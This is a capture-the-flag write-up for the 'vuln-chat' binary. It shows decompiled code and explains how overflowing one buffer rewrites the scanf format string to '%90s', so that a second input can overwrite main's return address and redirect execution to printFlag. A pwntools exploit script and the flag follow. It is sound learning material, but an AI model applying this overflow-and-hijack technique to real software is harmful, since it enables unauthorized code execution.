In Ghidra:
```c
undefined4 main(void)
{
  undefined local_31 [20];
  undefined local_1d [20];
  undefined4 local_9;
  undefined local_5;
  
  setvbuf(stdout,(char *)0x0,2,0x14);
  puts("----------- Welcome to vuln-chat -------------");
  printf("Enter your username: ");
  local_9 = 0x73303325;
  local_5 = 0;
  __isoc99_scanf(&local_9,local_1d);
  printf("Welcome %s!\n",local_1d);
  puts("Connecting to \'djinn\'");
  sleep(1);
  puts("--- \'djinn\' has joined your chat ---");
  puts("djinn: I have the information. But how do I know I can trust you?");
  printf("%s: ",local_1d);
  __isoc99_scanf(&local_9,local_31);
  puts("djinn: Sorry. That\'s not good enough");
  fflush(stdout);
  return 0;
}
```

We also find the following function:
```c
void printFlag(void)
{
  system("/bin/cat ./flag.txt");
  puts("Use it wisely");
  return;
}
```

We want to overwrite the return address of `main` to point to `printFlag`, thus hijacking control flow. To do so, we examine the offset between `local_31` and the return address using GDB ([[CSAW'16 Quals- Warmup#^68e764]]) and obtain an offest of `0x31` or 49.

However, the format string specified in `local_9` translates to `%30s`, which means we are limited to 30 bytes of input. However, we can overwrite `local_9` by overflowing the buffer of `local_1d` to be a number greater than 30s.

Thus, we obtain the following exploit:
```python
from pwn import process, p64

target = process("./vuln-chat")

payload = b"A" * 0x31
payload += p64(0x0804856b)

target.sendline("AAAAAAAAAAAAAAAAAAAA%90s")
target.sendline(payload)

target.interactive()
```

**Flag:** flag{g0ttem_b0yz}